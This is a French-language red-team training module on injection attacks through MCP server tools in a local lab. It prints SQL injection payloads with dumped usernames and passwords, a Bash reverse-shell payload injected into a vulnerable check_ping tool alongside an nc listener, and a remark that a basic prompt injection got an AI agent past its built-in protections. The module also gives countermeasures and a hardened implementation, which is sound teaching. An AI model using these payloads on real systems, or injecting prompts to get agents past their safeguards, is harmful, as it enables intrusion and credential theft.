# AT-MCP-MCPA-001: MCP Attack: Injection Vulnerabilities

**Prérequis**: [FO-MCP-PCF-001](/FO/FO-MCP/FO-MCP-PCF/FO-MCP-PCF-001/FO-MCP-PCF-001.md), [FO-MCP-PCF-002](/FO/FO-MCP/FO-MCP-PCF/FO-MCP-PCF-002/FO-MCP-PCF-002.md)

Les **attaques par injection** via *MCP (Model Context Protocol)* sont une famille d'attaque qui survient lorsque des données non fiables sont exploitées pour influencer le comportement d’un assistant IA ou détourner l’exécution des outils auxquels il est connecté.

Une **validation insuffisante des entrées ou une mauvaise gestion des arguments** transmis aux outils peuvent conduire à des actions non autorisées, à l’exposition d’informations sensibles ou à l’exécution de commandes inattendues.

En permettant aux modèles d’IA d’interagir avec des API, des bases de données, des systèmes de fichiers et des commandes externes, les **intégrations MCP élargissent la surface d’attaque** et peuvent amplifier les conséquences de ces vulnérabilités lorsque les mécanismes de validation, de contrôle d’accès et de sécurité sont insuffisants.

## Fiche de scénario Red Team : Injection SQL via un tool MCP

| ID       | Paramètre                   | Description                                                                                                                                                                                                                                                                |
| :------- | :-------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| TM-01.01 | **Actif ciblé**             | Base de données contenant les données utilisateurs.                                                                                                                                                                                                                        |
| TM-01.02 | **Acteur malveillant**      | Individu externe disposant d’un accès lui permettant d’invoquer un outil MCP.                                                                                                                                                                                              |
| TM-01.03 | **Vecteur d'attaque**       | Outil mis à disposition par le serveur MCP permettant de réaliser une requête SQL.                                                                                                                                                                                         |
| TM-01.04 | **Vulnérabilité exploitée** | Absence de requêtes SQL paramétrées ou validation insuffisante des entrées                                                                                                                                                                                                 |
| TM-01.05 | **Scénario d'attaque**      | L'attaquant fait une requête directe à un outil vulnérable du serveur MCP. Le *payload* de la requête de l'utilisateur contient une injection SQL et permet d'extraire une partie de la base de données utilisateurs, obtenant des données sensibles sur les utilisateurs. |
| TM-01.08 | **Catégorie STRIDE**        | **I — Information Disclosure**.                                                                                                                                                                                                                                            |
| TM-01.09 | **Référence OWASP**         | A05:2025 <br> MCP05:2025                                                                                                                                                                                                                                                   |
| TM-01.10 | **Référence MITRE ATT&CK**  | Aucune technique spécifique retenue à ce stade.                                                                                                                                                                                                                            |
| TM-01.11 | **Référence MITRE ATLAS**   | Aucune technique spécifique retenue à ce stade.                                                                                                                                                                                                                            |
| TM-01.12 | **Référence CWE**           | CWE-89                                                                                                                                                                                                                                                                     |

## Démonstration de l'attaque

> [!NOTE]
> **Le serveur MCP est faiblement protégé pour simplifier l'attaque**. Dans un cas réel, il est probable de voir des spécificités liées aux droits d'accès, à l'authentification ou des protections propres aux dépendances tiers (contrôle des requêtes, limitation du périmètre par compte...)

### Installation du laboratoire

1. **Installer l'environnement**: `cd at-mcp-mcpa-001 && uv sync`
2. **Lancer le serveur MCP**: `uv run uvicorn server_mcp:app --port 8000 --host 127.0.0.1`

### Exécution de l'attaque via accès direct au serveur MCP

#### Phase de reconnaissance

1. L'attaquant récupère les informations des *tools* disponibles via une requête `tool/list`.
2. L'attaquant observe les *tools* disponibles afin d'essayer de deviner le type de backend susceptible d'être utilisé par le *tool*.

    Dans cette étape, toute source d'informations potentielles est à exploiter. Par exemple, les arguments en entrée, le descriptif du *tools*, les schémas d'entrée/sortie, faire des requêtes valides... et même faire des requêtes invalides pour observer si les messages d'erreur sont porteurs d'informations (message d'erreur de base de données, erreur *bash*...).

    Lors de cette étape, le *tool* `get_user_orders` attire l'attention:

   * Le nom du *tool* peut laisser penser que ce dernier à accès à une source de données
   * Dans sa description, `Use for read-only queries` indique une capacité de requêtage (potentiellement SQL ou NoSQL).
   
    **Résultat d'une requête valide**:

    ```text
    client.call_tool("get_user_orders", {"name": "Sanguinius"})

        📦 ORDERS
    ─────────────────────────────────────────────
    #7    │ Sanguinius | Predator
    #18   │ Sanguinius | Land Raider
    #29   │ Sanguinius | Dreadnought
    #33   │ Sanguinius | Dreadnought
    #50   │ Sanguinius | Land Raider
    ─────────────────────────────────────────────
    Total : 5 commande(s)
    ```

#### Phase d'action

1. L'attaquant vérifie si le *tool* est vulnérable à une injection SQL via le *payload* `' OR 1=1 -- -`.

    > [!NOTE]
    > Ce *payload* est basique et ne garantit pas de fonctionner pour tout système. L'objectif de ce module n'est pas de présenter des méthodes d'injection SQL avancées mais leur intégration au sein de l'écosystème MCP.

    ```text
    client.call_tool("get_user_orders", {"name": "Sanguinius' OR 1=1 -- -"})

    📦 ORDERS
    ─────────────────────────────────────────────
    #1    │ Lorgar Aurelian | Rhino
    #2    │ Corvus Corax | Rhino
    #3    │ Konrad Curze | Dreadnought
    #4    │ Rogal Dorn | Gladiator
    #5    │ Konrad Curze | Rhino
    #6    │ Rogal Dorn | Repulsor
    #7    │ Sanguinius | Predator
    #8    │ Lion El'Jonson | Land Raider
    #9    │ Vulkan | Gladiator
    #10   │ Horus Lupercal | Gladiator
    #11   │ Corvus Corax | Land Raider
    #12   │ Fulgrim | Land Raider
    #13   │ Angron | Razorback
    #14   │ Angron | Vindicator
    [...]
    ```

    On observe une vulnérabilité critique du *tool* qui permet de récupérer l'historique de commandes de tous les utilisateurs. Bien qu'intéressant, l'attaquant s'intéresse aux comptes utilisateurs et non leurs historiques d'achat. Il doit donc adapter sa requête.

2. L'attaquant cartographie la base de données, adapte le *payload* à son besoin et extrait le contenu utile.

    > [!IMPORTANT]
    > Une phase de reconnaissance pour déterminer le type de base de données est souvent nécessaire car un *payload* peut marcher pour un type de base mais pas pour d'autres. De même, la cartographie de la base (table, paramètres...) doit être réalisée pour pouvoir définir le *payload* fonctionnel. Nous n'approfondirons pas cet aspect qui relève de l'injection SQL exclusivement.

    ```text
    client.call_tool("get_user_orders", {"name": "FAKE' UNION SELECT 1,name,password FROM users-- "})

    📦 ORDERS
    ─────────────────────────────────────────────
    #1    │ Alpharius Omegon | J4LjL2TvBqb8
    #1    │ Angron | JYoLTUx0TLZE
    #1    │ Corvus Corax | XzMqLBQnKV4F
    #1    │ Ferrus Manus | L0fvcrEapIkQ
    #1    │ Fulgrim | Kn9fHrC0ssJk
    #1    │ Horus Lupercal | 0VZ8TxL8xxBN
    #1    │ Jaghatai Khan | repwVdbz2uwa
    #1    │ Konrad Curze | z5R1nGSj6Ytg
    #1    │ Leman Russ | kPIAJiO3XQYZ
    #1    │ Lion El'Jonson | JQTwVBEfvoUh
    #1    │ Lorgar Aurelian | N6qHAuHXIrGB
    #1    │ Magnus le Rouge | 86fYAXl7MJPu
    #1    │ Mortarion | UZn3Uu67LYJy
    #1    │ Perturabo | 5iWMZeEvVoWp
    #1    │ Roboute Guilliman | xyDrv7YdjPW8
    #1    │ Rogal Dorn | 9Er8bmpuetk3
    #1    │ Sanguinius | hNAPqzCRXOwZ
    #1    │ Vulkan | 7Ln9BiF7pnCI
    ─────────────────────────────────────────────
    Total : 18 commande(s)
    ```

    On observe la fuite de la base utilisateurs via l'acquisition des noms et des mots de passe.

### Exécution de l'attaque via un agent connecté au serveur MCP

Un serveur MCP est souvent utilisé afin de fournir des capacités à un agent IA. Dans cette configuration, **l'attaquant n'agit pas avec le serveur MCP directement mais envoie des requêtes à un agent IA** qui va interpréter la demande.

Dans cette configuration, l'attaquant doit **réaliser un *prompt* permettant à l'agent d'exécuter un *payload***. Cette étape est délicate car elle soulève plusieurs problématiques:

* La requête doit être assez cohérente pour que l'agent utilise le bon *tool* avec les paramètres souhaités par l'attaquant.
* L'agent peut réaliser une interprétation de la requête et détecter des requêtes à risque. Dans ce contexte, en fonction de sa configuration, il est possible que l'agent bloque la requête de l'attaquant. Il est donc possiblement nécessaire que l'attaquant encapsule son *payload* dans un *prompt injection*.

Ci-dessous, une application de l'attaque réalisée via OpenCode. Un *prompt injection* basique a permis de s'affranchir des protections intégrées du modèle.

![](/AT/AT-MCP/AT-MCP-MCPA/AT-MCP-MCPA-001/images/opencode_request.png)

## Contre-mesure

| Mesure de sécurité                        | Description                                                                                                                                                                            |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Requêtes paramétrées**                  | Utiliser systématiquement des requêtes préparées et des paramètres liés plutôt que de construire des requêtes SQL par concaténation de chaînes.                                        |
| **Validation des entrées**                | Vérifier le type, le format, la longueur et les valeurs autorisées des paramètres transmis à l'outil MCP.                                                                              |
| **Principe du moindre privilège**         | Limiter les permissions du compte de base de données aux seules opérations et données nécessaires au fonctionnement de l'outil.                                                        |
| **Limitation des capacités SQL**          | Privilégier des opérations prédéfinies et des requêtes métier explicites plutôt que l'exécution de requêtes SQL arbitraires.                                                           |
| **Gestion des résultats**                 | Limiter les données retournées aux champs strictement nécessaires et éviter toute exposition excessive d'informations personnelles ou techniques (notamment dans le cas d'une erreur). |
| **Journalisation et surveillance**        | Enregistrer les appels aux outils, les erreurs SQL et les comportements anormaux afin de faciliter la détection et l'investigation des tentatives d'exploitation.                      |
| **Tests de sécurité**                     | Intégrer des tests d'injection SQL dans les processus de validation et d'audit des outils MCP.                                                                                         |

## Questionnaire

### Présentation du cas

Les serveurs MCP peuvent permettre à des assistants IA d’interagir avec des outils capables d’exécuter des actions sur un système. Si un outil est insuffisamment sécurisé, un attaquant peut tenter de détourner son fonctionnement pour exécuter des commandes système à distance.

Ce scénario illustre la mise en place d’un ***reverse shell Bash*** :

1. **Préparation de la machine A (Netcat)** : l’attaquant lance Netcat (nc) en mode écoute sur le port TCP 4444. Cette machine attend qu’une autre machine établisse une connexion.

2. **Exploitation de l’outil MCP** : l’attaquant invoque un outil MCP vulnérable, par exemple un outil permettant d’exécuter des commandes système. Il cherche à lui faire exécuter une commande Bash qui initie une connexion vers la machine A.

3. **Établissement de la connexion TCP** : la machine B ouvre une connexion vers la machine A. TCP assure l’établissement d’une connexion fiable entre les deux machines.

4. **Redirection du shell** : la commande Bash redirige les entrées et sorties du shell vers la connexion TCP. Les commandes reçues peuvent alors être exécutées sur la machine B, et leurs résultats renvoyés à la machine A.

5. **Contrôle à distance** : si la connexion fonctionne et que les protections du système ne bloquent pas l’opération, l’attaquant dispose d’un shell distant avec les privilèges du processus exécutant Bash.

#### Schéma récapitulatif

```text
        MACHINE A                         MACHINE B
     (serveur Netcat)                   (shell Bash)

   1. Écoute sur le port 4444
   nc -lv 127.0.0.1 4444
             |
             |  <--- Connexion TCP ---  2. Bash initie la connexion
             |                         bash -i >& /dev/tcp/localhost/4444 0>&1
             |
   3. Reçoit les commandes
             |
             |  ---- commande --------> Bash
             |  <---- résultat -------- Bash
             |
             +---- Contrôle du shell
```

<details>
<summary>Question 1: Faire la fiche red team pour le MCP Attack par injection de commande système</summary>

| ID       | Paramètre                   | Description                                                                                                                                                                                                                                                                                                                                                                                                                |
| -------- | --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| TM-02.01 | **Actif ciblé**             | Machine hôte exécutant le serveur MCP et ses outils.                                                                                                                                                                                                                                                                                                                                                                       |
| TM-02.02 | **Acteur malveillant**      | Individu externe disposant d’un accès lui permettant d’invoquer un outil MCP.                                                                                                                                                                                                                                                                                                                                              |
| TM-02.03 | **Vecteur d’attaque**       | Outil MCP permettant l’exécution de commandes système.                                                                                                                                                                                                                                                                                                                                                                     |
| TM-02.04 | **Vulnérabilité exploitée** | Exécution de commandes système non autorisée à partir d’entrées contrôlées par l’utilisateur, sans restrictions suffisantes.                                                                                                                                                                                                                                                                                               |
| TM-02.05 | **Scénario d’attaque**      | L’attaquant invoque un outil MCP vulnérable et lui transmet une entrée permettant l’exécution de commandes système arbitraires. Il déclenche l’ouverture d’une connexion TCP vers une machine qu’il contrôle, au moyen d’un shell Bash interactif. Cette connexion lui permet d’envoyer des commandes au système compromis et d’en récupérer les résultats, dans la limite des privilèges du processus exécutant le shell. |
| TM-02.08 | **Catégorie STRIDE**        |     **I — Information Disclosure** <br> **T — Tampering** (si altération du serveur par l'attaquant).                                                                                                                                                                                                                                                                                                                                                                                                                       |
| TM-02.09 | **Référence OWASP**             | **A05:2025 — Injection** <br> **MCP05:2025 — Command Injection & Execution**                                                                                                                                                                                                                                                                                          |
| TM-02.10 | **Référence MITRE ATT&CK**      | **T1059.004 — Unix Shell**                                                                                                                                                                                                                                                                                          |
| TM-02.11 | **Référence MITRE ATLAS**       | Aucune technique spécifique retenue à ce stade.                                                                                                                                                                                                                                                                                                                                                                            |
| TM-02.12 | **Référence CWE**               | **CWE-78 — Improper Neutralization of Special Elements used in an OS Command**                                                                                                                                                                                                                                                       |

</details>

<br>

Le serveur dispose d'un *tool* `check_ping`. Ce *tool* est vulnérable à une *OS command injection*. Utilisez ce *tool* afin d'obtenir un accès système au serveur MCP. Dans notre configuration, le serveur MCP partage le même système que l'attaquant pour des raisons de simplification.

Pour rappel, le serveur d'écoute de l'attaquant est lancé via `nc -lv 127.0.0.1 4444` et le *payload* permettant d'obtenir un *Reverse Shell* est `bash -i >& /dev/tcp/localhost/4444 0>&1`

<details>
<summary>Question 2: En utilisant le tool check_ping, obtenez un Reverse Shell</summary>

Dans un terminal, exécutez: `nc -lv 127.0.0.1 4444`

A partir du client_mcp, exécutez:
```python
result = await client.call_tool("check_ping", {"host": "0.0.0.0 && bash -i >& /dev/tcp/localhost/4444 0>&1"})
print(result.structured_content)

```

</details>

<br>

Vous pouvez observer que sur le terminal ayant exécuté la commande `nc`, vous avez un accès *bash* dans le répertoire où le code source du serveur MCP est présent.

<details>
<summary>Question 3: Quelle contre-mesures pour corriger cette vulnérabilité ?</summary>

| Contre-mesure essentielle          | Principe                                                                                       |
| ---------------------------------- | ---------------------------------------------------------------------------------------------- |
| Éviter `shell=True`                | Utiliser `shell=False` pour empêcher l'interprétation des entrées par un shell.                |
| Utiliser une liste d'arguments     | Séparer l'exécutable de ses arguments plutôt que construire une chaîne de commande.            |
| Valider les entrées                | Vérifier strictement le format et les valeurs autorisées.                                      |
| Privilégier les API natives        | Éviter l'exécution de commandes système lorsqu'une alternative adaptée existe.                 |
| Appliquer le moindre privilège     | Limiter les permissions du processus exécutant le serveur MCP.                                 |
| Limiter les capacités du tool      | Restreindre l'outil à des opérations prédéfinies et nécessaires.                               |
| Journaliser les événements         | Tracer les appels suspects et les erreurs pour faciliter la détection.                         |
| Tester la résistance à l'injection | Vérifier que les entrées malveillantes ne permettent pas d'exécuter des commandes non prévues. |

</details>

<br>

A partir des contre-mesures que vous avez défini, créez le *tool* `safe_check_ping` qui est sécurisé.

<details>
<summary>
Question 4: Implémenter la fonction ̀safe_check_ping(host: str) -> str`</summary>

```python
@mcp.tool()
def safe_check_ping(host: str) -> str:
    """Ping an IP to check if the service is up."""

    ip = host

    # Check if host is a valid IPv4 or IPv6 address
    import ipaddress
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        raise ToolError("Adresse IP invalide")

    command = ["ping", "-c", "1", str(ip)]

    result = subprocess.run(
        command,
        shell=False,
        capture_output=True,
        text=True,
        timeout=5,
        check=False
    )

    if result.returncode != 0:
        raise ToolError(f"{result.stderr}")
    else:
        return result.stdout
```

</details>
